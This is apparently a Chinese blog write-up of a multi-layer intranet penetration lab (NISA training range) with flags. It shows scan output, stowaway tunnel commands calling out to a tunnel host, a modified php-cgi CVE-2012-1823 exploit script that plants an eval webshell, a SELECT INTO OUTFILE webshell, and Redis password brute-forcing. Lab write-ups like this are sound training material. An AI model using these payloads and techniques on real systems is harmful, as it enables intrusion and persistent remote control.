@@ -1,0 +1,672 @@
+
+<!DOCTYPE html>
+<html lang="zh-CN">
+
+<head>
+    <meta charset="UTF-8" />
+    <title>某渗透（1） | 雲流のLowest World</title>
+    <meta name="author" content="C1oudfL0w0" />
+    <meta name="description" content="" />
+    <meta name="keywords" content="" />
+    <meta name="viewport" content="width=device-width,initial-scale=1.0,maximum-scale=1.0,user-scalable=0" />
+    <link rel="icon" href="/blog/images/croppedImage_cropped.jpg" />
+    <!-- cdn挂掉的时候要可以引用本地 -->
+<!-- <script src="https://cdn.staticfile.org/vue/3.2.45/vue.global.prod.min.js"></script> -->
+<script src="/blog/js/vue.global.prod.min.js"></script>
+
+
+<link rel="stylesheet" href="https://cdn.staticfile.org/font-awesome/6.2.1/css/all.min.css" />
+
+
+<link rel="stylesheet" href="/blog/css/all.min.css" />
+<link rel="stylesheet" href="/blog/css/fonts.min.css" />
+<link rel="stylesheet" href="/blog/css/search.css" />
+<script> const mixins = {}; </script>
+
+<!-- 引入jQuery-->
+<!-- <script type="text/javascript" src="https://apps.bdimg.com/libs/jquery/2.1.4/jquery.min.js"></script> -->
+<script src="/blog/js/jquery.min.js"></script>
+
+<!--改成了prismjs高亮-->
+
+<script src="/blog/js/lib/prism.js"></script>
+<link rel="stylesheet" href="/blog/css/prism.css" rel="stylesheet" />
+
+
+
+<script src="/blog/js/lib/preview.js"></script>
+
+
+
+
+
+
+
+
+
+
+<script src="/blog/js/lib/home.js"></script>
+
+<link rel="stylesheet" href="/blog/css/main.css" />
+<!-- 引入不蒜子-->
+
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+<script type="text/javascript" src="/blog/libs/codeBlock/codeBlockFuction.js"></script>
+<!-- 代码语言 -->
+<script type="text/javascript" src="/blog/libs/codeBlock/codeLang.js"></script>
+<!-- 代码块复制 -->
+<!-- 引入clipboard -->
+
+<script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.8/clipboard.min.js"></script>
+
+<script type="text/javascript" src="/blog/libs/codeBlock/codeCopy.js"></script>
+<!-- 代码块收缩 -->
+<script type="text/javascript" src="/blog/libs/codeBlock/codeShrink.js"></script> 
+<!-- 代码块折行 -->
+<style type="text/css">code[class*="language-"], pre[class*="language-"] { white-space: pre !important; }</style>
+<meta name="generator" content="Hexo 6.3.0"><link rel="alternate" href="/blog/atom.xml" title="雲流のLowest World" type="application/atom+xml">
+</head>
+
+<body>
+    <!--flag{never_g0nna g1ve_you up}-->
+
+    <!-- 页面点击特效 -->
+    <script type="text/javascript" src="/blog/js/love-click.js"></script>
+
+    <!-- 浏览器标题 -->
+    <script async type="text/javascript" src="/blog/js/FunnyTitle.js"></script>
+
+    <!-- 动态背景 -->
+    
+
+    <!--文章目录-->
+    
+    <div id="toc" class="toc-article">
+    <h3><i class="fas fa-stream"></i>  目录</h3>
+      <div class="toc-title"></div>
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%BC%80%E5%B1%80%E2%80%94%E2%80%94Shiro"><span class="toc-number">2.</span> <span class="toc-text">开局——Shiro</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%86%85%E7%BD%91%E4%BB%A3%E7%90%86%E7%AC%AC%E4%B8%80%E5%B1%82"><span class="toc-number">3.</span> <span class="toc-text">内网代理第一层</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#thinkphp-or-fastcgi"><span class="toc-number">4.</span> <span class="toc-text">thinkphp or fastcgi</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%86%85%E7%BD%91%E4%BB%A3%E7%90%86%E7%AC%AC%E4%BA%8C%E5%B1%82"><span class="toc-number">5.</span> <span class="toc-text">内网代理第二层</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#phpMyAdmin"><span class="toc-number">6.</span> <span class="toc-text">phpMyAdmin</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Redis"><span class="toc-number">7.</span> <span class="toc-text">Redis</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%86%85%E7%BD%91%E4%BB%A3%E7%90%86%E7%AC%AC%E4%B8%89%E5%B1%82"><span class="toc-number">8.</span> <span class="toc-text">内网代理第三层</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#struts2"><span class="toc-number">9.</span> <span class="toc-text">struts2</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#PostgresSQL"><span class="toc-number">10.</span> <span class="toc-text">PostgresSQL</span></a></li></ol>
+    </div>
+  
+
+    <!--返回顶部-->
+    <div id="totop" style="position:fixed;bottom:50px;right:60px;font-size: 48px;cursor: pointer;z-index: 10;">
+        <a title="返回顶部">↑</a>
+    </div>
+    <script src="/blog/js/totop.js"></script>
+
+    <div id="layout">
+        
+            <div id="content-background" ref="contentBackground" data-images="https://pic.imgdb.cn/item/65d61d809f345e8d03b8bc7a.png"></div>
+            
+        <transition name="fade">
+            <div id="loading" v-show="loading">
+                <div id="loading-circle">
+                    <h2>LOADING</h2>
+                    <p>第一次加载文章图片可能会花费较长时间</p>
+                    <p>要不挂个梯子试试？（x</p>
+                    <p>加载过慢请开启缓存&ensp;浏览器默认开启</p>
+                    <img src="/blog/images/loading.gif" />
+                </div>
+            </div>
+        </transition>
+        <transition name="into">
+            <div id="main" v-show="!loading">
+                <nav id="menu" ref="menu">
+    <div class="desktop-menu">
+        <a class="title" href="/blog/">
+            <span>雲流のLOWEST WORLD</span>
+        </a>
+        
+        <a href="/blog/">
+            <i class="fa-solid fa-house fa-fw"></i>
+            <span>&ensp;Home</span>
+        </a>
+        
+        <a href="/blog/about">
+            <i class="fa-solid fa-id-card fa-fw"></i>
+            <span>&ensp;About</span>
+        </a>
+        
+        <a href="/blog/archives">
+            <i class="fa-solid fa-box-archive fa-fw"></i>
+            <span>&ensp;Archives</span>
+        </a>
+        
+        <a href="/blog/categories">
+            <i class="fa-solid fa-bookmark fa-fw"></i>
+            <span>&ensp;Categories</span>
+        </a>
+        
+        <a href="/blog/tags">
+            <i class="fa-solid fa-tags fa-fw"></i>
+            <span>&ensp;Tags</span>
+        </a>
+        
+        <a href="/blog/links">
+            <i class="fa-solid fa-link fa-fw"></i>
+            <span>&ensp;Links</span>
+        </a>
+        
+        <a href="/blog/search">
+            <i class="fa-solid fa-search fa-fw"></i>
+            <span>&ensp;Search</span>
+        </a>
+        
+    </div>
+    <div id="mobile-menu">
+        <div class="curtain" v-show="showMenu" @click="showMenu = !showMenu"></div>
+        <div class="title" @click="showMenu = !showMenu">
+            <i class="fa-solid fa-bars fa-fw"></i>
+            <span>&emsp;雲流のLOWEST WORLD</span>
+        </div>
+        <transition name="slide">
+        <div class="items" v-show="showMenu">
+            
+            <a href="/blog/">
+                <div class="item">
+                    <div style="min-width: 20px; max-width: 50px; width: 10%">
+                        <i class="fa-solid fa-house fa-fw"></i>
+                    </div>
+                    <div style="min-width: 100px; max-width: 150%; width: 20%">Home</div>
+                </div>
+            </a>
+            
+            <a href="/blog/about">
+                <div class="item">
+                    <div style="min-width: 20px; max-width: 50px; width: 10%">
+                        <i class="fa-solid fa-id-card fa-fw"></i>
+                    </div>
+                    <div style="min-width: 100px; max-width: 150%; width: 20%">About</div>
+                </div>
+            </a>
+            
+            <a href="/blog/archives">
+                <div class="item">
+                    <div style="min-width: 20px; max-width: 50px; width: 10%">
+                        <i class="fa-solid fa-box-archive fa-fw"></i>
+                    </div>
+                    <div style="min-width: 100px; max-width: 150%; width: 20%">Archives</div>
+                </div>
+            </a>
+            
+            <a href="/blog/categories">
+                <div class="item">
+                    <div style="min-width: 20px; max-width: 50px; width: 10%">
+                        <i class="fa-solid fa-bookmark fa-fw"></i>
+                    </div>
+                    <div style="min-width: 100px; max-width: 150%; width: 20%">Categories</div>
+                </div>
+            </a>
+            
+            <a href="/blog/tags">
+                <div class="item">
+                    <div style="min-width: 20px; max-width: 50px; width: 10%">
+                        <i class="fa-solid fa-tags fa-fw"></i>
+                    </div>
+                    <div style="min-width: 100px; max-width: 150%; width: 20%">Tags</div>
+                </div>
+            </a>
+            
+            <a href="/blog/links">
+                <div class="item">
+                    <div style="min-width: 20px; max-width: 50px; width: 10%">
+                        <i class="fa-solid fa-link fa-fw"></i>
+                    </div>
+                    <div style="min-width: 100px; max-width: 150%; width: 20%">Links</div>
+                </div>
+            </a>
+            
+            <a href="/blog/search">
+                <div class="item">
+                    <div style="min-width: 20px; max-width: 50px; width: 10%">
+                        <i class="fa-solid fa-search fa-fw"></i>
+                    </div>
+                    <div style="min-width: 100px; max-width: 150%; width: 20%">Search</div>
+                </div>
+            </a>
+            
+        </div>
+        </transition>
+    </div>
+</nav>
+
+                <div class="article">
+    <div>
+        <h1>某渗透（1）</h1>
+    </div>
+    <div class="info">
+        <span class="date">
+            <span class="icon">
+                <i class="fa-solid fa-calendar fa-fw"></i>
+            </span>
+            2024/7/25
+        </span>
+        
+        <span class="category">
+            <a href="/blog/categories/%E6%B8%97%E9%80%8F/">
+                <span class="icon">
+                    <i class="fa-solid fa-bookmark fa-fw"></i>
+                </span>
+                渗透
+            </a>
+        </span>
+        
+        
+        <span class="tags">
+            <span class="icon">
+                <i class="fa-solid fa-tags fa-fw"></i>
+            </span>
+            
+            <span class="tag">
+                
+                <a href="/blog/tags/%E5%86%85%E7%BD%91/" style="color: #ff7d73">内网</a>
+            </span>
+            
+            <span class="tag">
+                
+                <a href="/blog/tags/Redis/" style="color: #03a9f4">Redis</a>
+            </span>
+            
+        </span>
+        
+        <!--文章字数统计-->
+        
+            
+<div style="margin-top:10px;">
+    <span class="post-time">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-keyboard-o"></i>
+        <span class="post-meta-item-text">  字数统计: </span>
+        <!-- 安装插件npm install hexo-wordcount --save -->
+        <span class="post-count">1.9k字</span>
+      </span>
+    </span>
+
+    <span class="post-time">
+      &nbsp; | &nbsp;
+      <span class="post-meta-item-icon">
+        <i class="fa fa-hourglass-half"></i>
+        <span class="post-meta-item-text">  阅读时长: </span>
+        <span class="post-count">10分</span>
+      </span>
+    </span>
+    
+    <!--不蒜子统计访问数-->
+    <span id="busuanzi_container_page_pv">
+    &nbsp; | &nbsp;
+    总文章阅读量：<span id="busuanzi_value_page_pv"></span>次
+    </span>
+</div>
+
+          
+    </div>
+    
+    <div class="content" v-pre>
+        <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>这是什么？NISA内部靶场，打一下</p>
+<span id="more"></span>
+
+<hr>
+<h1 id="开局——Shiro"><a href="#开局——Shiro" class="headerlink" title="开局——Shiro"></a>开局——Shiro</h1><p>开局进入靶机</p>
+<p>发现是一个shiro服务</p>
+<p><img src="/blog/2024/07/25/%E6%9F%90%E6%B8%97%E9%80%8F%EF%BC%881%EF%BC%89/image-20240725172148296.png" alt="image-20240725172148296"></p>
+<p>直接工具爆破一把梭</p>
+<p><img src="/blog/2024/07/25/%E6%9F%90%E6%B8%97%E9%80%8F%EF%BC%881%EF%BC%89/image-20240725172229146.png" alt="image-20240725172229146"></p>
+<p>蚁剑连接jsp马</p>
+<p>flag在&#x2F;flag.txt：<code>WSS-Studio&#123;Shiro-ad45528d-3341-41bc-8e68-7eb5b33e961c&#125;</code></p>
+<p>上传fscan开扫网段</p>
+<p><img src="/blog/2024/07/25/%E6%9F%90%E6%B8%97%E9%80%8F%EF%BC%881%EF%BC%89/image-20240725170928581.png" alt="image-20240725170928581"></p>
+<p><img src="/blog/2024/07/25/%E6%9F%90%E6%B8%97%E9%80%8F%EF%BC%881%EF%BC%89/image-20240725171037365.png" alt="image-20240725171037365"></p>
+<p>result.txt</p>
+<pre class="line-numbers language-txt" data-language="txt"><code class="language-txt">192.168.100.2:9000 open
+192.168.100.3:8080 open
+192.168.100.1:8080 open
+192.168.100.1:443 open
+192.168.100.2:80 open
+192.168.100.1:80 open
+192.168.100.1:22 open
+192.168.100.1:21 open
+[*] WebTitle https://192.168.100.1     code:502 len:552    title:502 Bad Gateway
+[*] WebTitle http://192.168.100.1      code:404 len:548    title:404 Not Found
+[+] FCGI 192.168.100.2:9000 
+Status: 403 Forbidden
+X-Powered-By: PHP/7.3.33
+Content-type: text/html; charset=UTF-8
+
+Access denied.
+stderr:Access to the script '/etc/issue' has been denied (see security.limit_extensions)
+plesa try other path,as -path /www/wwwroot/index.php
+[+] ftp 192.168.100.1:21:anonymous 
+[*] WebTitle http://192.168.100.3:8080 code:302 len:0      title:None 跳转url: http://192.168.100.3:8080/login;jsessionid=88A50ABBF8DA8065B091061A4A4A9FEB
+[*] WebTitle http://192.168.100.2      code:200 len:382    title:None
+[*] WebTitle http://192.168.100.1:8080 code:302 len:0      title:None 跳转url: http://192.168.100.1:8080/login;jsessionid=AA897C0EA332974F6AE4F884E3375F6F
+[*] WebTitle http://192.168.100.1:8080/login;jsessionid=AA897C0EA332974F6AE4F884E3375F6F code:200 len:2608   title:Login Page
+[*] WebTitle http://192.168.100.3:8080/login;jsessionid=88A50ABBF8DA8065B091061A4A4A9FEB code:200 len:2608   title:Login Page
+[+] PocScan http://192.168.100.2 poc-yaml-php-cgi-cve-2012-1823 
+[+] PocScan http://192.168.100.1:8080/ poc-yaml-shiro-key [&#123;key kPH+bIxk5D2deZiIxcaaaA==&#125; &#123;mode cbc&#125;]
+[+] PocScan http://192.168.100.3:8080/ poc-yaml-shiro-key [&#123;key kPH+bIxk5D2deZiIxcaaaA==&#125; &#123;mode cbc&#125;]<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>不知道为什么这里的shiro和tp服务都开了两个ip</p>
+<hr>
+<h1 id="内网代理第一层"><a href="#内网代理第一层" class="headerlink" title="内网代理第一层"></a>内网代理第一层</h1><p>在shiro靶机上传stowaway的 linux_x64_agent 进行内网代理，我这里用本机内网穿透作为公网ip</p>
+<p>在控制端上执行（我穿透出去是30908端口）</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">windows_x64_admin.exe <span class="token parameter variable">-l</span> <span class="token number">666</span> <span class="token parameter variable">-s</span> <span class="token number">123</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>在要被代理的服务器上执行</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">./linux_x64_agent <span class="token parameter variable">-c</span> 7c61c35132.vicp.fun:30908 <span class="token parameter variable">-s</span> <span class="token number">123</span> <span class="token parameter variable">--reconnect</span> <span class="token number">8</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="/blog/2024/07/25/%E6%9F%90%E6%B8%97%E9%80%8F%EF%BC%881%EF%BC%89/image-20240725171738901.png" alt="image-20240725171738901"></p>
+<p>在本机的6666端口做socks代理</p>
+<p>浏览器设置对应的ip和端口进行代理</p>
+<p><img src="/blog/2024/07/25/%E6%9F%90%E6%B8%97%E9%80%8F%EF%BC%881%EF%BC%89/image-20240725171822820.png" alt="image-20240725171822820"></p>
+<p>接下来直接访问内网ip即可</p>
+<hr>
+<h1 id="thinkphp-or-fastcgi"><a href="#thinkphp-or-fastcgi" class="headerlink" title="thinkphp or fastcgi"></a>thinkphp or fastcgi</h1><pre class="line-numbers language-txt" data-language="txt"><code class="language-txt">[+] PocScan http://192.168.100.2 poc-yaml-php-cgi-cve-2012-1823 <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>参考php-cgi-cve-2012-1823：<a target="_blank" rel="noopener" href="https://github.com/0xl0k1/CVE-2012-1823">https://github.com/0xl0k1/CVE-2012-1823</a></p>
+<p>上传php_cgi.sh到shiro靶机，直接跑脚本</p>
+<p><img src="/blog/2024/07/25/%E6%9F%90%E6%B8%97%E9%80%8F%EF%BC%881%EF%BC%89/image-20240725174534196.png" alt="image-20240725174534196"></p>
+<p>接下来修改一下sh脚本，上马</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token shebang important">#!/bin/bash</span>
+
+<span class="token keyword">function</span> <span class="token function-name function">ctrl_c</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+  <span class="token builtin class-name">echo</span> <span class="token parameter variable">-e</span> <span class="token string">"<span class="token entity" title="\n">\n</span><span class="token entity" title="\n">\n</span>[!] Exiting..."</span>
+  <span class="token builtin class-name">exit</span> <span class="token number">1</span>
+<span class="token punctuation">&#125;</span>
+
+<span class="token builtin class-name">trap</span> ctrl_c SIGINT
+
+<span class="token comment">#if [ $# -ne 2 ]; then</span>
+<span class="token comment">#    echo -e "\n[!] Usage: $0 &lt;RHOST> \"&lt;COMMAND>\""</span>
+<span class="token comment">#    echo -e "\nExample: $0 http://10.128.20.2 \"whoami\"\n"</span>
+<span class="token comment">#    exit 1</span>
+<span class="token comment">#fi</span>
+
+<span class="token assign-left variable">rhost</span><span class="token operator">=</span><span class="token variable">$1</span>
+<span class="token assign-left variable">command</span><span class="token operator">=</span><span class="token variable">$2</span>
+
+<span class="token function-name function">exploit</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+    <span class="token comment">#payload="&lt;?php system('$command'); die(); ?>"</span>
+    <span class="token assign-left variable">payload</span><span class="token operator">=</span><span class="token string">"&lt;?php file_put_contents('hack.php','&lt;?php eval(\<span class="token variable">$_POST</span>[1]);'); die(); ?>"</span>
+
+    <span class="token builtin class-name">echo</span>
+    <span class="token function">curl</span> <span class="token parameter variable">-s</span> <span class="token parameter variable">-X</span> POST <span class="token string">"<span class="token variable">$rhost</span>/?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input"</span> <span class="token parameter variable">-d</span> <span class="token string">"<span class="token variable">$payload</span>"</span> --connect-timeout <span class="token number">10</span>
+    
+    <span class="token keyword">if</span> <span class="token punctuation">[</span> <span class="token variable">$?</span> <span class="token parameter variable">-ne</span> <span class="token number">0</span> <span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token keyword">then</span>
+        <span class="token builtin class-name">echo</span> <span class="token string">"[!] Exploit failed!"</span>
+    <span class="token keyword">fi</span>
+<span class="token punctuation">&#125;</span>
+
+exploit<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>给蚁剑挂socks代理，然后连接</p>
+<p>传fscan</p>
+<p><img src="/blog/2024/07/25/%E6%9F%90%E6%B8%97%E9%80%8F%EF%BC%881%EF%BC%89/image-20240725180319718.png" alt="image-20240725180319718"></p>
+<p>开扫</p>
+<p><img src="/blog/2024/07/25/%E6%9F%90%E6%B8%97%E9%80%8F%EF%BC%881%EF%BC%89/image-20240725180502883.png" alt="image-20240725180502883"></p>
+<p>发现新的内网ip段10.85.101.4</p>
+<pre class="line-numbers language-txt" data-language="txt"><code class="language-txt">10.85.101.4:80 open
+10.85.101.3:80 open
+10.85.101.1:80 open
+10.85.101.1:22 open
+10.85.101.4:9000 open
+10.85.101.3:9000 open
+10.85.101.2:6379 open
+10.85.101.1:21 open
+10.85.101.1:443 open
+[+] ftp 10.85.101.1:21:anonymous 
+[*] WebTitle https://10.85.101.1       code:502 len:552    title:502 Bad Gateway
+[+] FCGI 10.85.101.3:9000 
+Status: 403 Forbidden
+X-Powered-By: PHP/7.3.33
+Content-type: text/html; charset=UTF-8
+
+Access denied.
+stderr:Access to the script '/etc/issue' has been denied (see security.limit_extensions)
+plesa try other path,as -path /www/wwwroot/index.php
+[*] WebTitle http://10.85.101.1        code:404 len:548    title:404 Not Found
+[+] FCGI 10.85.101.4:9000 
+Status: 403 Forbidden
+X-Powered-By: PHP/8.2.8
+Content-type: text/html; charset=UTF-8
+
+Access denied.
+
+[*] WebTitle http://10.85.101.3        code:200 len:382    title:None
+[*] WebTitle http://10.85.101.4        code:200 len:19411  title:phpMyAdmin
+[+] InfoScan http://10.85.101.4        [phpMyAdmin] 
+[+] PocScan http://10.85.101.3 poc-yaml-php-cgi-cve-2012-1823 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<hr>
+<h1 id="内网代理第二层"><a href="#内网代理第二层" class="headerlink" title="内网代理第二层"></a>内网代理第二层</h1><p>在tp靶机上面传入stowaway开始第二层代理</p>
+<p>在我们主机控制端上面依次输入</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">use <span class="token number">0</span>
+listen
+<span class="token number">1</span>
+<span class="token number">1234</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p><img src="/blog/2024/07/25/%E6%9F%90%E6%B8%97%E9%80%8F%EF%BC%881%EF%BC%89/image-20240725181725911.png" alt="image-20240725181725911"></p>
+<p>这样子就在shiro靶机上建立了一个监听1234端口的连接</p>
+<p>然后在tp靶机上连接：</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">./linux_x64_agent <span class="token parameter variable">-c</span> <span class="token number">192.168</span>.100.3:1234 <span class="token parameter variable">-s</span> <span class="token number">123</span> <span class="token parameter variable">--reconnect</span> <span class="token number">8</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="/blog/2024/07/25/%E6%9F%90%E6%B8%97%E9%80%8F%EF%BC%881%EF%BC%89/image-20240725181934329.png" alt="image-20240725181934329"></p>
+<p>此时节点+1</p>
+<p>然后再建立socks代理</p>
+<p><img src="/blog/2024/07/25/%E6%9F%90%E6%B8%97%E9%80%8F%EF%BC%881%EF%BC%89/image-20240725182134496.png" alt="image-20240725182134496"></p>
+<p>在6667端口</p>
+<hr>
+<h1 id="phpMyAdmin"><a href="#phpMyAdmin" class="headerlink" title="phpMyAdmin"></a>phpMyAdmin</h1><pre class="line-numbers language-txt" data-language="txt"><code class="language-txt">[*] WebTitle http://10.85.101.4        code:200 len:19411  title:phpMyAdmin<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>于是访问phpMyAdmin，弱密码</p>
+<p>服务与账密：<code>localhost:root:root</code></p>
+<p>在flag数据库中找到flag：<code>WSS-Studio&#123;Mysql-08a451ad-3869-4eeb-81b3-22fa354b8aa9&#125;</code></p>
+<p><img src="/blog/2024/07/25/%E6%9F%90%E6%B8%97%E9%80%8F%EF%BC%881%EF%BC%89/image-20240725183552068.png" alt="image-20240725183552068"></p>
+<p>接下来尝试getshell</p>
+<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">show</span> <span class="token keyword">global</span> variables <span class="token operator">like</span> <span class="token string">'%secure%'</span><span class="token punctuation">;</span> <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="/blog/2024/07/25/%E6%9F%90%E6%B8%97%E9%80%8F%EF%BC%881%EF%BC%89/image-20240725183841583.png" alt="image-20240725183841583"></p>
+<blockquote>
+<p>当<code>secure_file_priv</code>的值为<code>null</code> ，表示限制MySQL 不允许导入|导出<br>当<code>secure_file_priv</code>的值为<code>/tmp/</code> ，表示限制MySQL 的导入|导出只能发生在&#x2F;tmp&#x2F;目录下<br>当<code>secure_file_priv</code>的值没有具体值时，表示不对 MySQL 的导入|导出做限制</p>
+</blockquote>
+<p>可以直接写马</p>
+<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> <span class="token string">'&lt;?php eval($_POST[1]); ?>'</span> <span class="token keyword">into</span> <span class="token keyword">outfile</span> <span class="token string">'/var/www/html/hack.php'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="/blog/2024/07/25/%E6%9F%90%E6%B8%97%E9%80%8F%EF%BC%881%EF%BC%89/image-20240725184023330.png" alt="image-20240725184023330"></p>
+<p>得到flag：<code>WSS-Studio&#123;phpMyAdmin-ab21820c-a53d-4d7a-93aa-86d70a4a776b&#125;</code></p>
+<p>蚁剑连上，ifconfig 发现新的内网ip段172.56.102.3，传fscan扫内网</p>
+<pre class="line-numbers language-txt" data-language="txt"><code class="language-txt">172.56.102.3:80 open
+172.56.102.1:80 open
+172.56.102.1:22 open
+172.56.102.3:9000 open
+172.56.102.4:8080 open
+172.56.102.2:5432 open
+172.56.102.1:21 open
+172.56.102.1:443 open
+172.56.102.4:8009 open
+[+] FCGI 172.56.102.3:9000 
+Status: 403 Forbidden
+X-Powered-By: PHP/8.2.8
+Content-type: text/html; charset=UTF-8
+
+Access denied.
+
+[+] ftp 172.56.102.1:21:anonymous 
+[*] WebTitle http://172.56.102.4:8080  code:200 len:90     title:$Title$
+[*] WebTitle http://172.56.102.1       code:404 len:548    title:404 Not Found
+[*] WebTitle https://172.56.102.1      code:502 len:552    title:502 Bad Gateway
+[*] WebTitle http://172.56.102.3       code:200 len:19411  title:phpMyAdmin
+[+] Postgres:172.56.102.2:5432:postgres password
+[+] InfoScan http://172.56.102.3       [phpMyAdmin] 
+[+] PocScan http://172.56.102.4:8080 poc-yaml-struts2_045 poc1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<hr>
+<h1 id="Redis"><a href="#Redis" class="headerlink" title="Redis"></a>Redis</h1><p>后面打完了才发现漏了这个端口（</p>
+<pre class="line-numbers language-txt" data-language="txt"><code class="language-txt">10.85.101.2:6379 open<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>stowaway转发出来</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">(</span>node <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">>></span> forward <span class="token number">9000</span> <span class="token number">10.85</span>.101.2:6379<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>用这个对redis的密码进行爆破：<a target="_blank" rel="noopener" href="https://github.com/vgo0/redisbrute">https://github.com/vgo0/redisbrute</a></p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">┌──<span class="token punctuation">(</span>kali㉿kali<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~<span class="token punctuation">]</span>
+└─$ ./redisbrute <span class="token parameter variable">--ip</span> <span class="token number">192.168</span>.4.210 <span class="token parameter variable">--port</span> <span class="token number">9000</span> <span class="token parameter variable">--passwords</span> /usr/share/wordlists/rockyou.txt
+<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Valid password found - <span class="token number">12345</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+
+<p>得到密码12345</p>
+<p>登录redis，拿到flag</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">redis-cli <span class="token parameter variable">-h</span> <span class="token number">192.168</span>.4.210 <span class="token parameter variable">-p</span> <span class="token number">9000</span> <span class="token parameter variable">-a</span> <span class="token string">"12345"</span>
+<span class="token operator">></span> KEYS *
+<span class="token operator">></span> GET flag<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+
+
+
+<hr>
+<h1 id="内网代理第三层"><a href="#内网代理第三层" class="headerlink" title="内网代理第三层"></a>内网代理第三层</h1><p>同样的操作，在phpMyAdmin靶机上面传stowaway linux_x64_agent</p>
+<p>主机控制端输入</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">use <span class="token number">1</span>
+listen
+<span class="token number">1</span>
+<span class="token number">1234</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>即在tp靶机上开监听1234端口</p>
+<p>phpMyAdmin靶机上连接</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">./linux_x64_agent <span class="token parameter variable">-c</span> <span class="token number">10.85</span>.101.3:1234 <span class="token parameter variable">-s</span> <span class="token number">123</span> <span class="token parameter variable">--reconnect</span> <span class="token number">8</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>于是节点+1</p>
+<p><img src="/blog/2024/07/25/%E6%9F%90%E6%B8%97%E9%80%8F%EF%BC%881%EF%BC%89/image-20240725195249782.png" alt="image-20240725195249782"></p>
+<hr>
+<h1 id="struts2"><a href="#struts2" class="headerlink" title="struts2"></a>struts2</h1><pre class="line-numbers language-txt" data-language="txt"><code class="language-txt">[*] WebTitle http://172.56.102.4:8080  code:200 len:90     title:$Title$<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>是struts2的服务</p>
+<p><img src="/blog/2024/07/25/%E6%9F%90%E6%B8%97%E9%80%8F%EF%BC%881%EF%BC%89/image-20240725200208511.png" alt="image-20240725200208511"></p>
+<p>工具一把梭：<a target="_blank" rel="noopener" href="https://github.com/abc123info/Struts2VulsScanTools">https://github.com/abc123info/Struts2VulsScanTools</a></p>
